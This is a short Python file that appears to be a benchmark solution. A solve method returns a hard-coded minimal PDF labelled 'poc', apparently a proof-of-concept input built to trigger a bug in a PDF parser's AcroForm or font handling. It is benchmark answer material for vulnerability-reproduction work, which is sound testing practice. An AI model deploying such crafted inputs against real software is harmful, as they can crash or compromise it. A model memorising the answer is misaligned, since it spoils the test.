class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%PDF-1.4\n%âãÏÓ\n1 0 obj\n<< /Type /Catalog /AcroForm 2 0 R >>\nendobj\n2 0 obj\n<< /Fields [] /DR << /Font << /Helv 3 0 R >> >> /DA (/Helv 0 Tf 0 g ) >>\nendobj\n3 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000060 00000 n \n0000000150 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n220\n%%EOF'
        return poc